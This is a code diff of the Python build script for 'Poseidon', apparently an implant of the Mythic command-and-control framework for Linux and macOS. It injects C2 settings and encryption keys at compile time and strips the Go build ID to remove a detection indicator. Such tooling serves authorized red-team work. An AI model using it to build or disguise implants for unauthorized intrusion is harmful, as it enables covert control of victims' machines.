@@ -2,19 +2,17 @@ from mythic_payloadtype_container.PayloadBuilder import *
 from mythic_payloadtype_container.MythicCommandBase import *
 import asyncio
 import os
-import tempfile
-from distutils.dir_util import copy_tree
 import shutil
-import uuid
 import json
-import sys
+
+# Enable additional message details to the Mythic UI
+debug = False
 
 
 class Poseidon(PayloadType):
-
     name = "poseidon"
     file_extension = "bin"
-    author = "@xorrior, @djhohnstein"
+    author = "@xorrior, @djhohnstein, @Ne0nd0g"
     supported_os = [SupportedOS.Linux, SupportedOS.MacOS]
     wrapper = False
     wrapped_payloads = []
@@ -25,8 +23,11 @@ class Poseidon(PayloadType):
         "mode": BuildParameter(
             name="mode",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Choose the buildmode option. Default for executables, c-archive/archive/c-shared/shared are for libraries",
-            choices=["default", "c-archive"],
+            description="Choose the build mode option. Select default for executables, "
+                        "c-shared for a .dylib or .so file, "
+                        "or c-archive for a .Zip containing C source code with an archive and header file",
+            choices=["default", "c-archive", "c-shared"],
+            default_value="default",
         ),
     }
     c2_profiles = ["websocket", "http"]
@@ -50,81 +51,163 @@ class Poseidon(PayloadType):
     async def build(self) -> BuildResponse:
         # this function gets called to create an instance of your payload
         resp = BuildResponse(status=BuildStatus.Error)
+        target_os = "linux"
+        if self.selected_os == "macOS":
+            target_os = "darwin"
         if len(self.c2info) != 1:
             resp.build_stderr = "Poseidon only accepts one c2 profile at a time"
             return resp
         try:
-            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid).name
-            # shutil to copy payload files over
-            copy_tree(self.agent_code_path, agent_build_path)
-            file1 = open(
-                "{}/pkg/profiles/profile.go".format(agent_build_path), "r"
-            ).read()
-            file1 = file1.replace("UUID_HERE", self.uuid)
-            with open("{}/pkg/profiles/profile.go".format(agent_build_path), "w") as f:
-                f.write(file1)
+            agent_build_path = "/Mythic/agent_code"
+
+            # Get the selected C2 profile information (e.g., http or websocket)
             c2 = self.c2info[0]
             profile = c2.get_c2profile()["name"]
             if profile not in self.c2_profiles:
                 resp.build_message = "Invalid c2 profile name specified"
                 return resp
-            file1 = open(
-                "{}/c2_profiles/{}.go".format(agent_build_path, profile), "r"
-            ).read()
+
+            # This package path is used with Go's "-X" link flag to set the value string variables in code at compile
+            # time. This is how each profile's configurable options are passed in.
+            poseidon_repo_profile = f"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+
+            # Build Go link flags that are passed in at compile time through the "-ldflags=" argument
+            # https://golang.org/cmd/link/
+            ldflags = f"-s -w -X '{poseidon_repo_profile}.UUID={self.uuid}'"
+
+            # Iterate over the C2 profile parameters and associated variable through Go's "-X" link flag
             for key, val in c2.get_parameters_dict().items():
                 # dictionary instances will be crypto components
                 if isinstance(val, dict):
-                    file1 = file1.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
-                # headers is the name of the c2 profile parameter with an array of header values to set
+                    ldflags += f" -X '{poseidon_repo_profile}.{key}={val['enc_key']}'"
                 elif key == "headers":
-                    file1 = file1.replace(key, json.dumps(json.dumps(val)))
+                    v = json.dumps(val).replace('"', '\\"')
+                    ldflags += f" -X '{poseidon_repo_profile}.{key}={v}'"
                 else:
-                    file1 = file1.replace(key, val)
-            with open(
-                "{}/pkg/profiles/{}.go".format(agent_build_path, profile), "w"
-            ) as f:
-                f.write(file1)
-            command = "rm -rf /build; rm -rf /deps; rm -rf /go/src/poseidon;"
-            command += "mkdir -p /go/src/poseidon/src; mv * /go/src/poseidon/src; mv /go/src/poseidon/src/poseidon.go /go/src/poseidon/;"
-            command += "cd /go/src/poseidon;"
+                    if val:
+                        ldflags += f" -X '{poseidon_repo_profile}.{key}={val}'"
+
+            # Set the Go -buildid argument to an empty string to remove the indicator
+            ldflags += " -buildid="
+            command = "rm -rf /build; rm -rf /deps;"
             command += (
-                "xgo -tags={} --targets={}/{} -buildmode={} -out poseidon .".format(
+                "xgo -tags={} --targets={}/{} -buildmode={} -ldflags=\"{}\" -out poseidon .".format(
                     profile,
-                    "darwin" if self.selected_os == "macOS" else "linux",
+                    target_os,
                     "amd64",
-                    "default" if self.get_parameter("mode") == "default" else "c-archive",
+                    self.get_parameter("mode"),
+                    ldflags,
                 )
             )
+
+            # Execute the constructed xgo command to build Poseidon
             proc = await asyncio.create_subprocess_shell(
                 command,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
                 cwd=agent_build_path,
             )
+
+            # Collect and data written Standard Output and Standard Error
             stdout, stderr = await proc.communicate()
             if stdout:
-                resp.build_message = f"[stdout]\n{stdout.decode()}"
+                resp.build_stdout += f"\n[STDOUT]\n{stdout.decode()}"
+                if debug:
+                    resp.build_message += f'\n[BUILD]{command}\n'
             if stderr:
-                resp.build_stderr += f"[stderr]\n{stderr.decode()}"
-            if os.path.exists("/build"):
-                files = os.listdir("/build")
-                if len(files) == 1:
-                    resp.payload = open("/build/" + files[0], "rb").read()
-                    resp.build_message = "\nCreated payload!\n" + resp.build_message
+                resp.build_stderr += f"\n[STDERR]\n{stderr.decode()}"
+                if debug:
+                    resp.build_stderr += f'\n[BUILD]{command}\n'
+
+            # default build mode
+            if self.get_parameter("mode") == "default":
+                # Linux
+                if target_os == "linux":
+                    if os.path.exists(f"/build/poseidon-{target_os}-amd64"):
+                        resp.payload = open(f"/build/poseidon-{target_os}-amd64", "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-amd64 does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
+                # Darwin (macOS)
+                elif target_os == "darwin":
+                    if os.path.exists(f"/build/poseidon-{target_os}-10.06-amd64"):
+                        resp.payload = open(f"/build/poseidon-{target_os}-10.06-amd64", "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-10.06-amd64 does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
                 else:
-                    temp_uuid = str(uuid.uuid4())
-                    file1 = open(
-                        "/go/src/poseidon/src/sharedlib-darwin-linux.c", "r"
-                    ).read()
-                    with open("/build/sharedlib-darwin-linux.c", "w") as f:
-                        f.write(file1)
-                    shutil.make_archive(f"{agent_build_path}/{temp_uuid}", "zip", "/build")
-                    resp.payload = open(f"{agent_build_path}/{temp_uuid}" + ".zip", "rb").read()
-                    resp.build_message = "Created a zip archive of files!\n" + resp.build_message
-                resp.status = BuildStatus.Success
+                    resp.build_stderr += f"Unhandled operating system: {target_os} for {self.get_parameter('mode')} build mode"
+                    resp.status = BuildStatus.Error
+                    return resp
+            # C-shared (e.g., Dylib or SO)
+            elif self.get_parameter("mode") == "c-shared":
+                # Linux
+                if target_os == "linux":
+                    if os.path.exists(f"/build/poseidon-{target_os}-amd64.so"):
+                        resp.payload = open(f"/build/poseidon-{target_os}-amd64.so", "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-amd64.so does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
+                # Darwin (macOS)
+                elif target_os == "darwin":
+                    if os.path.exists(f"/build/poseidon-{target_os}-10.06-amd64.dylib"):
+                        resp.payload = open(f"/build/poseidon-{target_os}-10.06-amd64.dylib",
+                                            "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-10.06-amd64.dylib does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
+                else:
+                    resp.build_stderr += f"Unhandled operating system: {target_os} for {self.get_parameter('mode')} build mode"
+                    resp.status = BuildStatus.Error
+                    return resp
+            # C-shared (e.g., Dylib or SO)
+            elif self.get_parameter("mode") == "c-archive":
+                # Copy the C file into the build directory
+                file1 = open(
+                    f"/Mythic/agent_code/sharedlib/sharedlib-darwin-linux.c", "r"
+                ).read()
+                with open("/build/sharedlib-darwin-linux.c", "w") as f:
+                    f.write(file1)
+                # Linux
+                if target_os == "linux":
+                    if os.path.exists(f"/build/poseidon-{target_os}-amd64.a"):
+                        shutil.make_archive(f"{agent_build_path}/poseidon", "zip", "/build")
+                        resp.payload = open(f"{agent_build_path}/poseidon" + ".zip", "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-amd64.a does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
+                # Darwin (macOS)
+                elif target_os == "darwin":
+                    if os.path.exists(f"/build/poseidon-{target_os}-10.06-amd64.a"):
+                        shutil.make_archive(f"{agent_build_path}/poseidon", "zip", "/build")
+                        resp.payload = open(f"{agent_build_path}/poseidon" + ".zip", "rb").read()
+                    else:
+                        resp.build_stderr += f"/build/poseidon-{target_os}-10.06-amd64.a does not exist"
+                        resp.status = BuildStatus.Error
+                        return resp
+                else:
+                    resp.build_stderr += f"Unhandled operating system: {target_os} for " \
+                                         f"{self.get_parameter('mode')} build mode"
+                    resp.status = BuildStatus.Error
+                    return resp
+            # Unhandled
             else:
-                # something went wrong, return our errors
-                resp.build_stderr += "\nNo files created"
+                resp.build_stderr += f"Unhandled build mode {self.get_parameter('mode')}"
+                resp.status = BuildStatus.Error
+                return resp
+
+            # Successfully created the payload without error
+            resp.build_message += f'\nCreated Poseidon payload!\n' \
+                                  f'OS: {target_os}, ' \
+                                  f'Build Mode: {self.get_parameter("mode")}, ' \
+                                  f'C2 Profile: {profile}\n'
+            resp.status = BuildStatus.Success
+            return resp
         except Exception as e:
             resp.build_stderr += "\n" + str(e)
         return resp
